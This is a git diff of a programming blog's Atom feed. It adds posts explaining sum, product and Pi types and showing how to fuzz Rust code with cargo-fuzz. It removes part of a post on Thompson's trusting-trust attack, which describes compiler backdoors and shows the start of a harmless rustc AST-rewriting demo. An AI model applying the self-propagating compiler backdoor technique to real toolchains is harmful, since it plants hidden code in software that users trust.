@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Programming | In Pursuit of Laziness]]></title>
   <link href="http://manishearth.github.io/blog/categories/programming/atom.xml" rel="self"/>
   <link href="http://manishearth.github.io/"/>
-  <updated>2017-03-04T10:19:41-08:00</updated>
+  <updated>2017-03-04T18:17:10-08:00</updated>
   <id>http://manishearth.github.io/</id>
   <author>
     <name><![CDATA[Manish Goregaokar]]></name>
@@ -12,6 +12,494 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[What Are Sum, Product, and Pi Types?]]></title>
+    <link href="http://manishearth.github.io/blog/2017/03/04/what-are-sum-product-and-pi-types/"/>
+    <updated>2017-03-04T18:52:00-08:00</updated>
+    <id>http://manishearth.github.io/blog/2017/03/04/what-are-sum-product-and-pi-types</id>
+    <content type="html"><![CDATA[<p>You often hear people saying &ldquo;Language X<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> has sum types&rdquo; or &ldquo;I wish language X had sum types&rdquo;<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>,
+or &ldquo;Sum types are cool&rdquo;.</p>
+
+<p>Much like fezzes and bow ties, sum types are indeed cool.</p>
+
+<p><img class="center" src="/images/post/memes/sum-types-are-cool.jpg" width="400"></p>
+
+<p>These days, I&rsquo;ve also seen people asking about &ldquo;Pi types&rdquo;, because of <a href="https://github.com/ticki/rfcs/blob/pi-types-2/text/0000-pi-types.md">this Rust RFC</a>.</p>
+
+<p>But what does &ldquo;sum type&rdquo; mean? And why is it called that? And what, in the name of sanity, is
+a Pi type?</p>
+
+<p>Before I start, I&rsquo;ll meniton that while I will be covering some type theory to explain the names
+&ldquo;sum&rdquo; and &ldquo;product&rdquo;, you don&rsquo;t need to understand these names to use these things! Far too often
+do people have trouble understanding relatively straightforward concepts in languages because
+they have confusing names with confusing mathematical backgrounds<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>.</p>
+
+<h2>So what&rsquo;s a sum type? (the no-type-theory version)</h2>
+
+<p>In it&rsquo;s essence, a sum type is basically an &ldquo;or&rdquo; type. Let&rsquo;s first look at structs.</p>
+
+<pre><code class="rust">struct Foo {
+    x: bool,
+    y: String,
+}
+</code></pre>
+
+<p><code>Foo</code> is a <code>bool</code> AND a <code>String</code>. You need one of each to make one.
+This is an &ldquo;and&rdquo; type, or a &ldquo;product&rdquo; type (I&rsquo;ll explain the name later).</p>
+
+<p>So what would an &ldquo;or&rdquo; type be? It would be one where the value can be a
+<code>bool</code> OR a <code>String</code>. You can achieve this with C++ with a union:</p>
+
+<pre><code class="cpp">union Foo {
+    bool x;
+    string y;
+}
+
+foo.x = true; // set it to a bool
+foo.y = "blah"; // set it to a string
+</code></pre>
+
+<p>However, this isn&rsquo;t <em>exactly</em> right, since the value doesn&rsquo;t store the information
+of which variant it is. You could store <code>false</code> and the reader wouldn&rsquo;t know
+if you had stored an empty <code>string</code> or a <code>false</code> <code>bool</code>.</p>
+
+<p>There&rsquo;s a pattern called &ldquo;tagged union&rdquo; (or &ldquo;discriminated union&rdquo;) in C++ which bridges this gap.</p>
+
+<pre><code class="cpp">union FooUnion {
+    bool x;
+    string y;
+}
+
+enum FooTag {
+    BOOL, STRING
+}
+
+struct Foo {
+    FooUnion data;
+    FooTag tag;
+}
+
+// set it to a bool
+foo.data.x = true;
+foo.tag = BOOL;
+
+// set it to a string
+foo.data.y = "blah";
+foo.tag = STRING;
+</code></pre>
+
+<p>Here, you manually set the tag when setting the value. C++ also has <code>std::variant</code> (or
+<code>boost::variant</code>) that encapsulates this pattern with a better API.</p>
+
+<p>While I&rsquo;m calling these &ldquo;or&rdquo; types here, the technical term for such types is &ldquo;sum&rdquo; types.
+Other languages have built-in sum types.</p>
+
+<p>Rust has them and calls them &ldquo;enums&rdquo;. These are a more generalized version of the
+enums you see in other languages.</p>
+
+<pre><code class="rust">enum Foo {
+    Str(String),
+    Bool(bool)
+}
+
+let foo = Foo::Bool(true);
+
+// "pattern matching"
+match foo {
+    Str(s) =&gt; /* do something with string `s` */,
+    Bool(b) =&gt; /* do something with bool `b` */,
+}
+</code></pre>
+
+<p>Swift is similar, and also calls them enums
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='swift'><span class='line'><span class="k">enum</span> <span class="n">Foo</span> <span class="p">{</span>
+</span><span class='line'>    <span class="k">case</span> <span class="n">str</span><span class="p">(</span><span class="n">String</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">case</span> <span class="n">boolean</span><span class="p">(</span><span class="kt">bool</span><span class="p">)</span>
+</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">let</span> <span class="n">foo</span> <span class="o">=</span> <span class="n">Foo</span><span class="p">.</span><span class="n">boolean</span><span class="p">(</span><span class="nb">true</span><span class="p">);</span>
+</span><span class='line'><span class="k">switch</span> <span class="n">foo</span> <span class="p">{</span>
+</span><span class='line'>    <span class="k">case</span> <span class="p">.</span><span class="n">str</span><span class="p">(</span><span class="k">let</span> <span class="n">s</span><span class="p">)</span><span class="o">:</span>
+</span><span class='line'>        <span class="c1">// do something with string &lt;code&gt;s&lt;/code&gt;</span>
+</span><span class='line'>    <span class="k">case</span> <span class="p">.</span><span class="n">boolean</span><span class="p">(</span><span class="k">let</span> <span class="n">b</span><span class="p">)</span><span class="o">:</span>
+</span><span class='line'>        <span class="c1">// do something with boolean &lt;code&gt;b&lt;/code&gt;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>You can fake these in Go using interfaces, as well. Typescript has built-in
+unions which can be typechecked without any special effort, but you need
+to add a tag (like in C++) to pattern match on them.</p>
+
+<p>Of course, Haskell has them:</p>
+
+<pre><code class="haskell">data Foo = B Bool | S String
+
+-- define a function
+doThing :: Foo -&gt; SomeReturnType
+doThing (B b) = -- do something with boolean b
+doThing (S s) = -- do something with string s
+
+-- call it
+doThing (S "blah")
+doThing (B True)
+</code></pre>
+
+<p>One of the very common things that languages with sum types do is express nullability
+as a sum type;</p>
+
+<pre><code class="rust">// an Option is either "something", containing a type, or "nothing"
+enum Option&lt;T&gt; {
+    Some(T),
+    None
+}
+
+let x = Some("hello");
+match x {
+    Some(s) =&gt; println!("{}", s),
+    None =&gt; println!("no string for you"),
+}
+</code></pre>
+
+<p>Generally, these languages have &ldquo;pattern matching&rdquo;, which is like a <code>switch</code>
+statement on steroids. It lets you match on and destructure all kinds of things,
+sum types being one of them. Usually, these are &ldquo;exhaustive&rdquo;, which means that
+you are forced to handle all possible cases. In Rust, if you remove that <code>None</code>
+branch, the program won&rsquo;t compile. So you&rsquo;re forced to deal with the none case,
+<em>somehow</em>.</p>
+
+<p>In general sum types are a pretty neat and powerful tool. Languages with them built-in
+tend to make heavy use of them, almost as much as they use structs.</p>
+
+<h2>Why do we call it a sum type?</h2>
+
+<p><em>Here be (type theory) <a href="https://en.wikipedia.org/wiki/Compilers:_Principles,_Techniques,_and_Tools">dragons</a></em></p>
+
+<p>Let&rsquo;s step back a bit and figure out what a type is.</p>
+
+<p>It&rsquo;s really a restriction on the values allowed. It can have things like methods and whatnot
+dangling off it, but that&rsquo;s not so important here.</p>
+
+<p></p>
+
+<p>In other words, it&rsquo;s a <a href="https://en.wikipedia.org/wiki/Set_(mathematics)">set</a>. A boolean is the set &#92;(\{\mathtt{true}, \mathtt{false}\}&#92;). An 8-bit unsigned integer
+(<code>u8</code> in Rust) is the set &#92;(\{0, 1, 2, 3, &hellip;. 254, 255\}&#92;). A string is a set with
+(uncountably) infinite elements, containing all possible valid strings<sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup>.</p>
+
+<p>What&rsquo;s a struct? A struct with two fields contains every possible combination of elements from the two sets.</p>
+
+<pre><code class="rust">struct Foo {
+    x: bool,
+    y: u8,
+}
+</code></pre>
+
+<p>The set of possible values of <code>Foo</code> is</p>
+
+<p>&#92;[\{(\mathtt{x}, \mathtt{y}): \mathtt{x} \in \mathtt{bool}, \mathtt y \in \mathtt{u8}\}&#92;]</p>
+
+<p>(Read as &ldquo;The set of all &#92;((\mathtt{x}, \mathtt{y})&#92;) where &#92;(\tt x&#92;) is in &#92;(\mathtt{bool}&#92;) and &#92;(\tt y&#92;) is in &#92;(\mathtt{u8}&#92;)&rdquo;)</p>
+
+<p>This is called a <em>Cartesian product</em>, and is often represented as &#92;(\tt Foo = bool \times u8&#92;).
+An easy way to view this as a product is to count the possible values: The number of possible values
+of <code>Foo</code> is the number of possible values of <code>bool</code> (2) <em>times</em> the number of possible values of <code>u8</code> (256).</p>
+
+<p>A general struct would be a &ldquo;product&rdquo; of the types of each field, so something like</p>
+
+<pre><code class="rust">struct Bar {
+    x: bool,
+    y: u8,
+    z: bool,
+    w: String
+}
+</code></pre>
+
+<p>is &#92;(\mathtt{Bar = bool \times u8 \times bool \times String}&#92;)</p>
+
+<p>This is why structs are called &ldquo;product types&rdquo;<sup id="fnref:5"><a href="#fn:5" rel="footnote">5</a></sup>.</p>
+
+<p>You can probably guess what comes next &ndash; Rust/Swift enums are &ldquo;sum types&rdquo;, because they are the
+<em>sum</em> of the two sets.</p>
+
+<pre><code class="rust">enum Foo {
+    Bool(bool),
+    Integer(u8),
+}
+</code></pre>
+
+<p>is a set of all values which are valid booleans, <em>and</em> all values which are valid integers. This
+is a sum of sets, &#92;(\tt Foo = bool + u8&#92;). More accurately, it&rsquo;s a <em>disjoint union</em>, where if the input
+sets have overlap, the overlap is &ldquo;discriminated&rdquo; out.</p>
+
+<p>An example of this being a disjoint union is:</p>
+
+<pre><code class="rust">enum Bar {
+    Bool1(bool),
+    Bool2(bool),
+    Integer(u8).
+}
+</code></pre>
+
+<p>This is not &#92;(\tt Bar = bool + bool + u8&#92;), because &#92;(\tt bool + bool = bool&#92;), (regular set addition doesn&rsquo;t duplicate the overlap).</p>
+
+<p>Instead, it&rsquo;s something like</p>
+
+<p>&#92;[\tt Bar = bool + otherbool + u8&#92;]</p>
+
+<p>where &#92;(\tt otherbool&#92;) is also a set &#92;(\tt \{true, false\}&#92;),
+except that these elements are <em>different</em> from those in &#92;(\tt bool&#92;). You can look at it as if</p>
+
+<p>&#92;[\tt otherbool = \{true_2, false_2\}&#92;]</p>
+
+<p>so that</p>
+
+<p>&#92;[\mathtt{bool + otherbool} = \{\mathtt{true, false, true_2, false_2}\}&#92;]</p>
+
+<p>For sum types, the number of possible values is the sum of the number of possible values of
+each of its component types.</p>
+
+<p>So, Rust/Swift enums are &ldquo;sum types&rdquo;.</p>
+
+<p>You may often notice the terminology &ldquo;algebraic datatypes&rdquo; (ADT) being used, usually that&rsquo;s just
+talking about sum and product types together &ndash; a language with ADTs will have both.</p>
+
+<p></p>
+
+<h2>What, in the name of sanity, is a Pi type?</h2>
+
+<p><img class="center" src="/images/post/memes/what-in-the-name-of-sanity.jpg" width="400"></p>
+
+<p>It&rsquo;s essentially a form of dependent type. A dependent type is when your type
+can depend on a value. An example of this is integer generics, where you
+can do things like <code>Array&lt;bool, 5&gt;</code>, or <code>template&lt;unsigned int N, typename T&gt; Array&lt;T, N&gt; ...</code> (in C++).</p>
+
+<p>The name comes from how a constructor for these types would look:</p>
+
+<pre><code class="rust">// create an array of booleans from a given integer
+// I made up this syntax, this is _not_ from the Rust Pi type RFC
+fn make_array(x: u8) -&gt; Array&lt;bool, x&gt; {
+    // ...
+}
+
+// or
+// (the proposed rust syntax)
+fn make_array&lt;const x: u8&gt;() -&gt; Array&lt;bool, x&gt; {
+   // ... 
+}
+</code></pre>
+
+<p>What&rsquo;s the type of <code>make_array</code> here? It&rsquo;s a function which can accept any integer
+and return a different type in each case. You can view it as a set of functions,
+where each function corresponds to a different integer input. It&rsquo;s basically:</p>
+
+<pre><code class="rust">struct make_array {
+    make_array_0: fn() -&gt; Array&lt;bool, 0&gt;,
+    make_array_1: fn() -&gt; Array&lt;bool, 1&gt;,
+    make_array_2: fn() -&gt; Array&lt;bool, 2&gt;,
+    make_array_3: fn() -&gt; Array&lt;bool, 3&gt;,
+    make_array_4: fn() -&gt; Array&lt;bool, 4&gt;,
+    make_array_5: fn() -&gt; Array&lt;bool, 5&gt;,
+    // ... 
+}
+</code></pre>
+
+<p>Given an input, the function chooses the right child function here, and calls it.</p>
+
+<p></p>
+
+<p>This is a struct, or a product type! But it&rsquo;s a product of an infinite number of types<sup id="fnref:6"><a href="#fn:6" rel="footnote">6</a></sup>.</p>
+
+<p>We can look at it as</p>
+
+<p>&#92;[\texttt{make_array} = \prod\limits_{x = 0}^\infty\left( \texttt{fn()} \mathtt\to \texttt{Array&lt;bool, x&gt;}\right)&#92;]</p>
+
+<p>The usage of the &#92;(\Pi&#92;) symbol to denote an iterative product gives this the name &ldquo;Pi type&rdquo;.</p>
+
+<p>In languages with lazy evaluation (like Haskell), there is no difference between having a function
+that can give you a value, and actually having the value. So, the type of <code>make_array</code> is the type
+of <code>Array&lt;bool, N&gt;</code> itself in languages with lazy evaluation.</p>
+
+<p>There&rsquo;s also a notion of a &ldquo;sigma&rdquo; type, which is basically</p>
+
+<p>&#92;[\sum\limits_{x = 0}^\infty \left(\texttt{fn()} \mathtt\to \texttt{Array&lt;bool, x&gt;}\right)&#92;]</p>
+
+<p>With the Pi type, we had &ldquo;for all N we can
+construct an array&rdquo;, with the sigma type we have &ldquo;there exists some N for which we can construct this array&rdquo;.
+As you can expect, this type can be expressed with a possibly-infinite enum, and instances of this type
+are basically instances of <code>Array&lt;bool, N&gt;</code> for some specific <code>N</code> where the <code>N</code> is only known at runtime.
+(much like how regular sum types are instances of one amongst multiple types, where the exact type
+is only known at runtime). <code>Vec&lt;bool&gt;</code> is conceptually similar to the sigma type <code>Array&lt;bool, ?&gt;</code>.</p>
+
+<p></p>
+
+<h2>Wrapping up</h2>
+
+<p>Types are sets, and we can do set-theory things on them to make cooler types.</p>
+
+<p>Let&rsquo;s try to avoid using confusing terminology, however. If Rust <em>does</em> get &ldquo;pi types&rdquo;,
+let&rsquo;s just call them &ldquo;dependent types&rdquo; or &ldquo;integer generics&rdquo; :)</p>
+
+<p><em>Thanks to Zaki, Avi Weinstock, Corey Richardson, and Peter Atashian for reviewing drafts of this post.</em></p>
+<div class="footnotes">
+<hr/>
+<ol>
+<li id="fn:1">
+<p>Rust, Swift, <em>sort of</em> Typescript, and all the functional languages who had it before it was cool.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
+<li id="fn:2">
+<p>Lookin&#8217; at you, Go.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
+<li id="fn:3">
+<p>Moooooooooooooooonads<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
+<li id="fn:4">
+<p>Though you can argue that strings often have their length bounded by the pointer size of the platform, so it&rsquo;s still a finite set.<a href="#fnref:4" rev="footnote">&#8617;</a></p></li>
+<li id="fn:5">
+<p>This even holds for zero-sized types, for more examples, check out <a href="http://chris-taylor.github.io/blog/2013/02/10/the-algebra-of-algebraic-data-types/">this blog post</a><a href="#fnref:5" rev="footnote">&#8617;</a></p></li>
+<li id="fn:6">
+<p>Like with strings, in practice this would probably be bounded by the integer type chosen<a href="#fnref:6" rev="footnote">&#8617;</a></p></li>
+</ol>
+</div>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Mitigating Underhandedness: Fuzzing Your Code]]></title>
+    <link href="http://manishearth.github.io/blog/2017/03/02/mitigating-underhandedness-fuzzing-your-code/"/>
+    <updated>2017-03-02T16:13:54-08:00</updated>
+    <id>http://manishearth.github.io/blog/2017/03/02/mitigating-underhandedness-fuzzing-your-code</id>
+    <content type="html"><![CDATA[<p><em>This may be part of a collaborative blog post series about underhanded Rust code. Or it may not. I invite you to write your own posts about underhanded code to make it so!</em></p>
+
+<p>The <a href="https://underhanded.rs/blog/2017/02/28/extending-submission-deadline.en-US.html">submission deadline for the Underhanded Rust competition has been extended</a>, so
+let&rsquo;s talk more about how to keep your code working and free from bugs/underhandedness!</p>
+
+<p><a href="http://manishearth.github.io/blog/2017/01/21/mitigating-underhandedness-clippy/">Previously, we talked about Clippy</a>.</p>
+
+<p>Now, really, underhanded bugs are just another form of bug. And how do we find bugs? We test!</p>
+
+<p>We write unit tests. We run the code under Valgrind, ASan, MSan, UBSan, TSan, and any other sanitizer
+we can get our hands on. Tests tests tests. More tests. Tests.</p>
+
+<p>But, there&rsquo;s a problem here. You need to write <em>test cases</em> to make this work. These are inputs
+fed to your code after which you check whatever invariants your code has. There&rsquo;s
+no guarantee that the test cases you write will exercise all the code paths in your
+program. This applies for sanitizers too, sanitizers are limited to testing the code paths
+that your test cases hit.</p>
+
+<p>Of course, you can use code coverage tools to ensure that all these code paths will be hit.
+However, there&rsquo;s a conflict here &ndash; your code will have many code paths that are
+<em>not supposed to be hit ever</em>. Things like redundant bounds checks, null checks, etc.
+In Rust programs such code paths generally use panics.</p>
+
+<p>Now, these code paths are never <em>supposed</em> to be hit, so they&rsquo;ll never show up in your
+code coverage. But you don&rsquo;t have a guarantee that they can never be hit, short
+of formally verifying your program. The only solution here is writing more test cases.</p>
+
+<p>Aside from that, even ignoring those code paths, you still need to manually write
+test cases for everything. For each possible code path in your code, if you want to
+be sure.</p>
+
+<p>Who wants to manually write a million test cases?</p>
+
+<p><img class="center" src="/images/post/memes/aint-nobody.jpg" width="400"></p>
+
+<p><img class="center" src="/images/post/memes/that-would-be-great.jpg" width="400"></p>
+
+<p>Enter fuzzing. What fuzzing will do is feed your program random inputs, carefully watching the
+codepaths being taken, and try to massage the inputs so that new, interesting (usually crashy)
+codepaths are taken. You write tests for the fuzzer such that they can accept arbitrary input, and
+the fuzzer will find cases where they crash or panic.</p>
+
+<p>One of the most popular fuzzers out there is <a href="http://lcamtuf.coredump.cx/afl/">AFL</a>, which takes a binary and feeds it random
+input. Rust <a href="https://github.com/rust-fuzz/afl.rs">has a library that you can use for running AFL</a>, however it currently needs
+to be run via a Docker image or needs a recompilation of rustc, since it adds a custom LLVM pass.
+We&rsquo;re working on making this step unnecessary.</p>
+
+<p>However, as of a few weeks ago, we now have bindings for <a href="http://llvm.org/docs/LibFuzzer.html">libFuzzer</a>, which uses existing
+instrumentation options built in to LLVM itself! libFuzzer works a bit differently; instead
+of giving it a binary, you write a function in a special way and give it a library containing
+that function, which it turns into a fuzzer binary. This is faster, since the fuzzer lives
+inside the binary itself and it doesn&rsquo;t need to execute a new program each time.</p>
+
+<p>Using libFuzzer in Rust is easy. Install <a href="https://github.com/rust-fuzz/cargo-fuzz"><code>cargo-fuzz</code></a>:</p>
+
+<pre><code class="sh">$ cargo install cargo-fuzz
+</code></pre>
+
+<p>Now, within your crate, initialize the fuzz setup:</p>
+
+<pre><code class="sh">$ cargo fuzz --init
+</code></pre>
+
+<p>This will create a fuzzing crate in <code>fuzz/</code>, with a single &ldquo;fuzz target&rdquo;, <code>fuzzer_script_1</code>.
+You can add more such targets with <code>cargo fuzz --add name_of_target</code>. Fuzz targets are small libraries
+with a single function in them; the function that will be called over and over again by the fuzzer.
+It is up to you to fill in the body of this function, such that the program will crash or panic
+if and only if something goes wrong.</p>
+
+<p>For example, for the <code>unicode-segmentation</code> crate, <a href="https://github.com/Manishearth/unicode-segmentation/blob/99b3636ef6b4d96c05644403c1c2eccba2c5f5db/fuzz/fuzzers/equality.rs">one of the fuzz targets I wrote</a> just
+takes the string, splits it by grapheme and word boundaries, recombines it, and then asserts that
+the new string is the same.</p>
+
+<pre><code class="rust">pub extern fn go(data: &amp;[u8]) {
+    // we only deal with unicode input
+    // bail early, *without panicking* if the input isn't utf8
+    if let Ok(s) = str::from_utf8(data) {
+        // split into graphemes, recollect
+        let result = UnicodeSegmentation::graphemes(s, true).flat_map(|s| s.chars()).collect::&lt;String&gt;();
+        // recollected string should be the same as the input, panic if not
+        assert_eq!(s, result);
+
+        // split into words, recollect
+        let result = s.split_word_bounds().flat_map(|s| s.chars()).collect::&lt;String&gt;();
+        // recollected string should be the same as the input, panic if not
+        assert_eq!(s, result);
+    }
+}
+</code></pre>
+
+<p>The other targets ensure that the forward and reverse word/grapheme
+iterators produce the same results. They all take the byte slice input, attempt to convert to UTF8
+(silently failing  &ndash; NOT panicking &ndash; if not possible), and then use the string as an input
+testcase.</p>
+
+<p>Now, these targets will panic if the test fails, and the fuzzer will try and force that panic to
+happen. But also, these targets put together exercise most of the API surface of the crate, so
+the fuzzer may also find panics (or even segmentation faults!) in the crate itself. For example,
+the <a href="https://github.com/servo/rust-url/blob/3e5541e51e02d8acb10a6ea8ab174ba1bc23ce41/fuzz/fuzzers/parse.rs#L10">fuzz target for rust-url</a> doesn&rsquo;t itself assert; all it does is try to parse the given
+string. The fuzzer will try to get the URL parser to panic.</p>
+
+<p>To run a fuzz script:</p>
+
+<pre><code class="sh">$ cargo fuzz --fuzz-target fuzzer_script_1
+</code></pre>
+
+<p>This will start the fuzzer, running until it finds a crash or panic. It may also
+find other things like inputs which make the code abnormally slow.</p>
+
+<p>Fuzzing can find some interesting bugs. For example, the unicode-segmentation
+fuzzers found <a href="https://github.com/unicode-rs/unicode-segmentation/issues/19">this bug</a>, where an emoji followed by <em>two</em> skin tone modifiers
+isn&rsquo;t handled correctly. We&rsquo;d probably never have been able to come up with this testcase on our
+own. But the fuzzer could find it!</p>
+
+<p>The Rust Cap&#8217;n Proto crate ran cargo-fuzz and found <a href="https://dwrensha.github.io/capnproto-rust/2017/02/27/cargo-fuzz.html">a whole ton of bugs</a>. There
+are more such examples <a href="https://github.com/rust-fuzz/cargo-fuzz#trophy-case">in the trophy case</a> (be sure to add any of your own findings
+to the trophy case, too!)</p>
+
+<p>cargo-fuzz is relatively new, so the API and behavior may still be tweaked a bit before 1.0.
+But you can start taking it for a spin now, and finding bugs!</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Let's Stop Ascribing Meaning to Code Points]]></title>
@@ -795,866 +1283,6 @@ use of <code>DerefMove</code> semantics, or if you work on the compiler. But it 
 <p>It will probably eventually be replaced or made equivalent to the <code>&lt;-</code> syntax before stabilizing<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
 <li id="fn:3">
 <p>It&rsquo;s easier to special case the first two, much like how <code>for</code> loops are aware of the iterator trait without the iterator trait being extremely special cased<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
-</ol>
-</div>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Reflections on Rusting Trust]]></title>
-    <link href="http://manishearth.github.io/blog/2016/12/02/reflections-on-rusting-trust/"/>
-    <updated>2016-12-02T11:28:27-08:00</updated>
-    <id>http://manishearth.github.io/blog/2016/12/02/reflections-on-rusting-trust</id>
-    <content type="html"><![CDATA[<p>The Rust compiler is written in Rust. This is overall a pretty common practice in compiler
-development. This usually means that the process of building the compiler involves downloading a
-(typically) older version of the compiler.</p>
-
-<p>This also means that the compiler is vulnerable to what is colloquially known as the &ldquo;Trusting
-Trust&rdquo; attack, an attack described in <a href="https://www.ece.cmu.edu/~ganger/712.fall02/papers/p761-thompson.pdf">Ken Thompson&rsquo;s acceptance speech for the 1983 Turing Award</a>.
-This kind of thing fascinates me, so I decided to try writing one myself. It&rsquo;s stuff like this which
-started my interest in compilers, and I hope this post can help get others interested the same way.</p>
-
-<p>To be clear, this isn&rsquo;t an indictment of Rust&rsquo;s security. Quite a few languages out there have
-popular self-hosted compilers (C, C++, Haskell, Scala, D, Go) and are vulnerable to this attack. For
-this attack to have any effect, one needs to be able to uniformly distribute this compiler, and
-there are roughly equivalent ways of doing the same level of damage with that kind of access.</p>
-
-<p>If you already know what a trusting trust attack is, you can skip the next section. If you just want
-to see the code, it&rsquo;s in the <a href="https://github.com/Manishearth/rust/tree/rusting-trust">trusting-trust branch</a> on my Rust fork, specifically
-<a href="https://github.com/Manishearth/rust/blob/rusting-trust/src/librustc_driver/driver.rs#L541">this code</a>.</p>
-
-<h2>The attack</h2>
-
-<p>The essence of the attack is this:</p>
-
-<p>An attacker can conceivably change a compiler such that it can detect a particular kind of application and
-make malicious changes to it. The example given in the talk was the UNIX <code>login</code> program &mdash; the attacker
-can tweak a compiler so as to detect that it is compiling the <code>login</code> program, and compile in a
-backdoor that lets it unconditionally accept a special password (created by the attacker) for any
-user, thereby giving the attacker access to all accounts on all systems that have <code>login</code> compiled
-by their modified compiler.</p>
-
-<p>However, this change would be detected in the source. If it was not included in the source, this
-change would disappear in the next release of the compiler, or when someone else compiles the
-compiler from source. Avoiding this attack is easily done by compiling your own compilers and not
-downloading untrusted binaries. This is good advice in general regarding untrusted binaries, and it
-equally applies here.</p>
-
-<p>To counter this, the attacker can go one step further. If they can tweak the compiler so as to
-backdoor <code>login</code>, they could also tweak the compiler so as to backdoor itself. The attacker needs to
-modify the compiler with a backdoor which detects when it is compiling the same compiler, and
-introduces <em>itself</em> into the compiler that it is compiling. On top of this it can also introduce
-backdoors into <code>login</code> or whatever other program the attacker is interested in.</p>
-
-<p>Now, in this case, even if the backdoor is removed from the source, <em>every compiler compiled using
-this backdoored compiler will be similarly backdoored</em>. So if this backdoored compiler somehow
-starts getting distributed, it will spread itself as it is used to compile more copies of itself
-(e.g. newer versions, etc). And it will be virtually undetectable &mdash; since the source doesn&rsquo;t
-need to be modified for it to work; just the non-human-readable binary.</p>
-
-<p>Of course, there are ways to protect against this. Ultimately, before a compiler for language X
-existed, that compiler had to be written in some other language Y. If you can track the sources back
-to that point you can bootstrap a working compiler from scratch and keep compiling newer compiler
-versions till you reach the present. This raises the question of whether or not Y&rsquo;s compiler is
-backdoored. While it sounds pretty unlikely that such a backdoor could be so robust as to work on
-two different compilers and stay put throughout the history of X, you can of course trace back Y
-back to other languages and so on till you find a compiler in assembly that you can verify<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>.</p>
-
-<h2>Backdooring Rust</h2>
-
-<p>Alright, so I want to backdoor my compiler. I first have to decide when in the pipeline the code
-that insert backdoors executes. The Rust compiler operates by taking source code, parsing it into a
-syntax tree (AST), transforming it into some intermediate representations (HIR and MIR), and feeding
-it to LLVM in the form of LLVM IR, after which LLVM does its thing and creates binaries. A backdoor
-can be inserted at any point in this stage. To me, it seems like it&rsquo;s easier to insert one into the
-AST, because it&rsquo;s easier to obtain AST from source, and this is important as we&rsquo;ll see soon. It also
-makes this attack less practically viable<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>, which is nice since this is just a fun exercise and I
-don&rsquo;t actually want to backdoor the compiler.</p>
-
-<p>So the moment the compiler finishes parsing, my code will modify the AST to insert a backdoor.</p>
-
-<p>First, I&rsquo;ll try to write a simpler backdoor; one which doesn&rsquo;t affect the compiler but instead
-affects some programs. I shall write a backdoor that replaces occurrences of the string &ldquo;hello world&rdquo;
-with &ldquo;जगाला नमस्कार&rdquo;, a rough translation of the same in my native language.</p>
-
-<p>Now, in rustc, the <code>rustc_driver</code> crate is where the whole process of compiling is coordinated. In particular,
-<a href="https://github.com/rust-lang/rust/blob/1cabe2151299c63497abc3a20bd08c04c0cd32a3/src/librustc_driver/driver.rs#L546"><code>phase_2_configure_and_expand</code></a> is run right after parsing (which is <a href="https://github.com/rust-lang/rust/blob/1cabe2151299c63497abc3a20bd08c04c0cd32a3/src/librustc_driver/driver.rs#L485">phase 1</a>). Perfect.
-Within that function, the <code>krate</code> variable contains the parsed AST for the crate<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>, and we need to modify that.</p>
-
-<p>In this case, there&rsquo;s already machinery in <a href="http://manishearth.github.io/rust-internals-docs/syntax/fold/"><code>syntax::fold</code></a> for mutating ASTs based on patterns. A
-<a href="http://manishearth.github.io/rust-internals-docs/syntax/fold/trait.Folder.html"><code>Folder</code></a> basically has the ability to walk the AST, producing a mirror AST, with modifications. For
-each kind of node, you get to specify a function which will produce a node to be used in its place.
-Most such functions will default to no-op (returning the same node).</p>
-
-<p>So I write the following <code>Folder</code>:</p>
-
-<pre><code class="rust">// Understanding the minute details of this code isn't important; it is a bit complex
-// since the API used here isn't meant to be used this way. Focus on the comments.
-
-mod trust {
-    use syntax::fold::*;
-    use syntax::ast::*;
-    use syntax::parse::token::InternedString;
-    use syntax::ptr::P;
-    struct TrustFolder;
-
-    // The trait contains default impls which we override for specific cases
-    impl Folder for TrustFolder {
-        // every time we come across an expression, run this function
-        // on it and replace it with the produced expression in the tree
-        fn fold_expr(&amp;mut self, expr: P&lt;Expr&gt;) -&gt; P&lt;Expr&gt; {
-            // The peculiar `.map` pattern needs to be used here
-            // because of the way AST nodes are stored in immutable
-            // `P&lt;T&gt;` pointers. The AST is not typically mutated.
-            expr.map(|mut expr| {
-                match expr.node {
-                    ExprKind::Lit(ref mut l) =&gt; {
-                        *l = l.clone().map(|mut l| {
-                            // look for string literals
-                            if let LitKind::Str(ref mut s, _) = l.node {
-                                // replace their contents
-                                if s == "hello world" {
-                                    *s = InternedString::new("जगाला नमस्कार");
-                                }
-                            }
-                            l
-                        })
-                    }
-                    _ =&gt; ()
-                }
-                // recurse down expression with the default fold
-                noop_fold_expr(expr, self)
-            })
-        }
